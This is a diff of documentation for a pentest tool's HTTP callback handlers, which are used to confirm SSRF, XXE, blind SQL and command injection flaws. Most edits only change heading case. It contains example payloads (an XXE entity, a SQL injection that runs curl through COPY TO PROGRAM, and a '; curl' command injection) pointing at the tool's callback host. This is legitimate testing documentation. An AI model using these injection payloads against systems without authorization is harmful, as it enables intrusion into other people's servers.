@@ -7,70 +7,70 @@ description: "Capture HTTP callbacks for out-of-band vulnerability testing"
 
 HTTP Handlers provide endpoints for capturing HTTP callbacks, useful for validating out-of-band vulnerabilities like SSRF, XXE, and blind injection attacks.
 
-## What It Does
+## What it does
 
 <CardGroup cols={2}>
-  <Card title="HTTP Callbacks" icon="arrow-right-to-bracket">
+  <Card title="HTTP callbacks" icon="arrow-right-to-bracket">
     Capture incoming requests
   </Card>
-  <Card title="DNS Logging" icon="globe">
+  <Card title="DNS logging" icon="globe">
     Monitor DNS lookups
   </Card>
-  <Card title="Protocol Support" icon="server">
+  <Card title="Protocol support" icon="server">
     HTTP and HTTPS
   </Card>
-  <Card title="Data Capture" icon="database">
+  <Card title="Data capture" icon="database">
     Full request details
   </Card>
 </CardGroup>
 
-## How to Use
+## How to use
 
 <Steps>
-  <Step title="Create Handler">
+  <Step title="Create handler">
     Generate a unique handler endpoint.
   </Step>
-  <Step title="Use in Testing">
+  <Step title="Use in testing">
     Include handler URL in test payloads.
   </Step>
-  <Step title="Trigger Vulnerability">
+  <Step title="Trigger vulnerability">
     Submit payloads to the target.
   </Step>
-  <Step title="Check Results">
+  <Step title="Check results">
     View captured callbacks.
   </Step>
 </Steps>
 
-## Use Cases
+## Use cases
 
-### SSRF Testing
+### SSRF testing
 
 Test if the server makes outbound requests:
 ```
 https://handler.pentest-tools.com/h/YOUR_ID
 ```
 
-### XXE Testing
+### XXE testing
 
 External entity payload:
 ```xml
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://handler.pentest-tools.com/h/YOUR_ID">]>
 ```
 
-### Blind SQL Injection
+### Blind SQL injection
 
 Time-based with HTTP callback:
 ```sql
 '; SELECT pg_sleep(5); COPY (SELECT 'test') TO PROGRAM 'curl https://handler.pentest-tools.com/h/YOUR_ID'; --
 ```
 
-### Command Injection
+### Command injection
 
 ```bash
 ; curl https://handler.pentest-tools.com/h/YOUR_ID
 ```
 
-## Captured Data
+## Captured data
 
 For each callback:
 - Timestamp
@@ -80,7 +80,7 @@ For each callback:
 - Request body
 - Query parameters
 
-## Handler Features
+## Handler features
 
 | Feature | Description |
 |---------|-------------|
@@ -93,13 +93,12 @@ For each callback:
 Use unique handler IDs for each test case to easily correlate which payload triggered which callback.
 </Tip>
 
-## Important Notes
+## Important notes
 
 <Note>
 HTTP handlers help prove out-of-band vulnerabilities that would otherwise be difficult to demonstrate. They're essential for SSRF and blind XXE testing.
 </Note>
 
-## Related Tools
+## Related tools
 
-- [Website Vulnerability Scanner](/tools/website-vulnerability-scanner)
-- [XSS Handlers](/tools/xss-handlers)
+- [Website Vulnerability Scanner](/tools/website-vulnerability-scanner) — Comprehensive web app testing
